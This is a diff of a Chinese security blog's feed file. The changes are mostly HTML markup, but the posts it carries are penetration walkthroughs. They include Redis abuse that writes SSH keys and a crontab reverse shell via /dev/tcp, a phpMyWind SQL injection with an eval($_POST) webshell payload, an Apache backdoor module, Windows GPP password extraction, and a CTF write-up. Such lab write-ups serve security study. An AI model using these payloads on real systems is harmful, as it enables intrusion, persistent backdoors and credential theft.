-&lt;/div&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 &lt;p&gt;然后执行&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;redis-cli -h 192.168.192.133 flushall
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;redis-cli -h 192.168.192.133 flushall
 
 cat redis.txt | redis-cli -h 192.168.192.133 -x set pwn
 
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 &lt;p&gt;登录redis  redis-cli -h 192.168.192.133&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;CONFIG set dir /root/.ssh/
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;CONFIG set dir /root/.ssh/
 config set dbfilename &quot;authorized_keys&quot;
 save
 exit
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 &lt;p&gt;然后就可以使用ssh的私钥登录了&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ssh -i redis.pub root@192.168.192.133
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ssh -i redis.pub root@192.168.192.133
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;&lt;img src=&quot;http://ogmho3r7t.bkt.clouddn.com/2017-04-17-2436203329.png&quot; alt=&quot;2436203329&quot; /&gt;&lt;/p&gt;
 
@@ -681,7 +745,7 @@ exit
 
 &lt;p&gt;redis+crontab&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;redis-cli config set dir /var/spool/cron/
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;redis-cli config set dir /var/spool/cron/
 
 redis-cli config set dbfilename root
 
@@ -690,8 +754,7 @@ echo -e &quot;\n\n*/1 * * * * bash -i &amp;gt;&amp;amp; /dev/tcp/127.0.0.1/8443 
 redis-cli save
 
 nc -lvv 8443
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;hr /&gt;
 
@@ -727,15 +790,14 @@ nc -lvv 8443
         <title>phpmywind-v5.3任意代码执行</title>
         <description>&lt;p&gt;&lt;strong&gt;测试环境&lt;/strong&gt;&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;wamp+phpmywind-v5.3
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;wamp+phpmywind-v5.3
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;&lt;strong&gt;0x01漏洞分析&lt;/strong&gt;&lt;/p&gt;
 
 &lt;p&gt;先看全局文件include\common.inc.php&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;//检查外部传递的值并转义
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;//检查外部传递的值并转义
 function _RunMagicQuotes(&amp;amp;$svar)
 {
 	//PHP5.4已经将此函数移除
@@ -775,23 +837,21 @@ foreach(array('_GET','_POST') as $_request)
 	}
 }
 
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 &lt;p&gt;这段代码的作用就是做全局的GPC转义以及注册全局变量，类似于一个为register_global。&lt;/p&gt;
 
 &lt;p&gt;看到4g.php&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;else if($m == 'show')
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;else if($m == 'show')
 {
 	require_once(PHPMYWIND_TEMP.'/default/mobile/show.php');
 	exit();
 }
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;我们继续跟进default/mobile/show.php这个文件,看到以下代码&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;?php require_once(dirname(__FILE__).'/nav.php'); ?&amp;gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;?php require_once(dirname(__FILE__).'/nav.php'); ?&amp;gt;
 		&amp;lt;!-- 栏目内容 --&amp;gt;
 		&amp;lt;?php
 		$row = $dosql-&amp;gt;GetOne(&quot;SELECT * FROM `#@__infoclass` WHERE id = $cid AND checkinfo = 'true' ORDER BY orderid ASC&quot;);
@@ -818,14 +878,13 @@ foreach(array('_GET','_POST') as $_request)
 				$dosql-&amp;gt;ExecNoneQuery(&quot;UPDATE `$tbname` SET hits=hits+1 WHERE `id`=$id&quot;);
 				$row = $dosql-&amp;gt;GetOne(&quot;SELECT * from `$tbname` WHERE `id`=$id&quot;);
 				?&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;值得注意的是&lt;code class=&quot;highlighter-rouge&quot;&gt;$row['infotype']&lt;/code&gt;的值，如果这个变量的返回值为空的话，那么就会导致不会给&lt;code class=&quot;highlighter-rouge&quot;&gt;$tbname&lt;/code&gt;这个变量赋值，并且&lt;code class=&quot;highlighter-rouge&quot;&gt;$tbname&lt;/code&gt;进入了下面的sql语句中，位置就是表名。那我们可以通过控制cid的值，然后使&lt;code class=&quot;highlighter-rouge&quot;&gt;$row['infotype']&lt;/code&gt;无返回值，进一步为$tbname变量赋值.很显然这里就是一个SQL注入了。&lt;/p&gt;
 
 &lt;p&gt;然后看到goodsshow.php文件&lt;/p&gt;
 
-&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
+&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
 
 			&lt;span class=&quot;c1&quot;&gt;//检测文档正确性
 &lt;/span&gt;			&lt;span class=&quot;nv&quot;&gt;$r&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$dosql&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;GetOne&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;SELECT * FROM `#@__goods` WHERE id=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$id&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
@@ -927,12 +986,11 @@ foreach(array('_GET','_POST') as $_request)
 								&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
 							&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
 							&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;我们重点关注一下String2Array函数，可以在\include\commnon.fun.php找到定义&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;if(!function_exists('String2Array'))
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;if(!function_exists('String2Array'))
 {
 	function String2Array($data)
 	{
@@ -941,8 +999,7 @@ foreach(array('_GET','_POST') as $_request)
 		return $array;
 	}
 }
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;很明显这会造成一个代码执行。我们再次回到上面的代码。&lt;code class=&quot;highlighter-rouge&quot;&gt;$rowattr = String2Array($row['attrstr']);&lt;/code&gt;其中&lt;code class=&quot;highlighter-rouge&quot;&gt;$row['attrstr']&lt;/code&gt;是通过&lt;code class=&quot;highlighter-rouge&quot;&gt;SELECT * FROM `#@__goods` WHERE id=$id&lt;/code&gt;这个语句获取的。如果我们能修改&lt;code class=&quot;highlighter-rouge&quot;&gt;#@__goods&lt;/code&gt;表里面的attrstr字段值的话，那就可以造成任意代码执行了。刚好可以配合前面的一个SQL注入。这样就能完美发挥这个漏洞了。&lt;/p&gt;
 
@@ -952,10 +1009,9 @@ foreach(array('_GET','_POST') as $_request)
 
 &lt;p&gt;第一步我们构造&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://127.0.0.1/PHPMyWind_5.3/4g.php?m=show&amp;amp;cid=2&amp;amp;tbname=pmw_goods`  SET attrstr=0x6576616c28245f504f53545b27746f6d61746f275d29 where classid=12  or @`'` %23 and @`'`
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://127.0.0.1/PHPMyWind_5.3/4g.php?m=show&amp;amp;cid=2&amp;amp;tbname=pmw_goods`  SET attrstr=0x6576616c28245f504f53545b27746f6d61746f275d29 where classid=12  or @`'` %23 and @`'`
 
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 &lt;p&gt;这个cms有80sec的防注入，所以我们要绕过这个防注入。网上有详细的文章，这里就不复述了。&lt;/p&gt;
 
 &lt;p&gt;然后可以看到数据库里&lt;/p&gt;
@@ -996,15 +1052,14 @@ http://127.0.0.1/PHPMyWind_5.3/goodsshow.php?cid=12&amp;amp;tid=10&amp;amp;id=1&
         <title>Apache端口复用后门</title>
         <description>&lt;p&gt;测试环境&lt;/p&gt;
 
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;CentOSx64 6.5
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;CentOSx64 6.5
 Apache2.5
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 &lt;p&gt;&lt;strong&gt;0x01 利用方式&lt;/strong&gt;&lt;/p&gt;
 
 &lt;p&gt;先修改后门的里面的httpd22.h文件，不修改的话，在apache启动的时候会报错&lt;/p&gt;
 
-&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;err&quot;&gt;将&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;
+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;err&quot;&gt;将&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;
 &lt;span class=&quot;cp&quot;&gt;#define MODULE_MAGIC_COOKIE 0x41503230UL
 &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;改为&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;
 &lt;span class=&quot;cp&quot;&gt;#define MODULE_MAGIC_COOKIE 0x41503232UL
@@ -1013,8 +1068,7 @@ Apache2.5
 &lt;span class=&quot;cp&quot;&gt;#define MODULE_MAGIC_NUMBER_MAJOR 20020903
 &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;改为&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt;
 &lt;span class=&quot;cp&quot;&gt;#define MODULE_MAGIC_NUMBER_MAJOR 20051115
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 &lt;p&gt;然后保存。输入make linux进行编译&lt;/p&gt;
 
 &lt;p&gt;&lt;img src=&quot;http://ogmho3r7t.bkt.clouddn.com/2017-04-17-185317750.jpg&quot; alt=&quot;185317750&quot; /&gt;&lt;/p&gt;
@@ -1048,9 +1102,8 @@ Apache2.5
 
 &lt;p&gt;2.通过&lt;/p&gt;
 
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ps -ef | grep http | head -n 1 | awk &lt;span class=&quot;s1&quot;&gt;'{system(&quot;ls -l /proc/&quot;$2&quot;/fd&quot;)}'&lt;/span&gt; | grep pipe | wc -l
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ps &lt;span class=&quot;nt&quot;&gt;-ef&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;grep &lt;/span&gt;http | head &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; 1 | awk &lt;span class=&quot;s1&quot;&gt;'{system(&quot;ls -l /proc/&quot;$2&quot;/fd&quot;)}'&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;grep &lt;/span&gt;pipe | wc &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 &lt;p&gt;正常情况下是64，加载了mod_rootme后是66&lt;/p&gt;
 
 &lt;p&gt;3.在web目录下写个phpinfo看是否加载了mod_rootme模块&lt;/p&gt;
@@ -1073,10 +1126,9 @@ Apache2.5
         <title>windows2008 GPP漏洞利用</title>
         <description>&lt;p&gt;测试环境&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;windows7 普通域成员
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;windows7 普通域成员
 windows2008 域控
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 &lt;p&gt;首先部署GPP，这里我部署的策略是给域成员都添加一个test用户，密码为test123
 ![QQ截图20150815011901.png][1]&lt;/p&gt;
 
@@ -1093,28 +1145,25 @@ windows2008 域控
 
 &lt;p&gt;然后到域成员win7这台机器上执行&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gpupdate &amp;amp;&amp;amp; net user
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;gpupdate &amp;amp;&amp;amp; net user
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;&lt;img src=&quot;http://ogmho3r7t.bkt.clouddn.com/2017-04-17-1994353166.png&quot; alt=&quot;1994353166&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;然后可以访问&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;\\tomato-dc\SYSVOL\tomato.com\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;\\tomato-dc\SYSVOL\tomato.com\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 &lt;p&gt;这个目录下面有个group.xml文件&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&amp;gt;&lt;/span&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&amp;gt;&lt;/span&gt;
 &lt;span class=&quot;nt&quot;&gt;&amp;lt;Groups&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;clsid=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;{3125E937-EB16-4b4c-9934-544FC6D24D26}&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;User&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;clsid=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;test&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;image=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;2&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;changed=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;2015-08-14 17:21:15&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;uid=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;{149655A8-CC7E-4A49-8A3C-403D1615AF63}&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;Properties&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;action=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;U&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;newName=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;fullName=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;description=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;cpassword=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;aUcBkzsNN7W1N3eM/JmKvw&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;changeLogon=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;1&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;noChange=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;0&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;neverExpires=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;0&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;acctDisabled=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;0&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;userName=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;test&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;/&amp;gt;&amp;lt;/User&amp;gt;&lt;/span&gt;
 &lt;span class=&quot;nt&quot;&gt;&amp;lt;/Groups&amp;gt;&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 &lt;p&gt;这里面存储着添加用户的账号密码。其中密码通过AES加密了，但是微软把解密的私钥写在了文档里面导致可以解密密码。
 除了这个地方存在账号密码，以下路径可能也存在&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Services\Services.xml 
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Services\Services.xml 
 
 ScheduledTasks\ScheduledTasks.xml 
 
@@ -1123,8 +1172,7 @@ Printers\Printers.xml
 Drives\Drives.xml
 
 DataSources\DataSources.xml
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 &lt;p&gt;拿到加密密码之后，我们使用脚本解密&lt;/p&gt;
 
 &lt;p&gt;&lt;img src=&quot;http://ogmho3r7t.bkt.clouddn.com/2017-04-17-2062133923.png&quot; alt=&quot;2062133923&quot; /&gt;&lt;/p&gt;
@@ -1153,11 +1201,10 @@ DataSources\DataSources.xml
 
 &lt;p&gt;首先保存那个图片，然后用winhex在尾部发现&lt;/p&gt;
 
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
 Where is the key?&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;ZW1lbS4uLiAvY3RmXzM2MF9mbGFn&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
 
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;p&gt;然后base64_decode之后，为emem… /ctf_360_flag 后面群里提示苹果电脑，然后访问&lt;/p&gt;
 
@@ -1171,7 +1218,7 @@ Where is the key?&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;ZW1lbS4uLiAvY3RmX
 
 &lt;p&gt;http://isg.campus.360.cn/web2/check.php.swp&lt;/p&gt;
 
-&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
+&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
 &lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
 
 &lt;span class=&quot;sd&quot;&gt;/***
@@ -1196,20 +1243,19 @@ test code 2
 
 &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; 
 
-    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$db&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'admin'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;email='&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'email'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]}&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;' ANDcode='&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'code'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]}&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'&quot;)) 
+    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$db&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'admin'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;email='&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'email'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;' ANDcode='&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'code'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;'&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; 
 
-        die('&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;error&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;');
+        &lt;span class=&quot;k&quot;&gt;die&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'error'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
 
-    $_SESSION['&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;email&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;']= $_GET['&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;email&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt; 
+    &lt;span class=&quot;nv&quot;&gt;$_SESSION&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'email'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'email'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt; 
 
         &lt;span class=&quot;o&quot;&gt;..........&lt;/span&gt;
 
-&lt;span class=&quot;si&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
 
-?&amp;gt;
+&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;
 
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
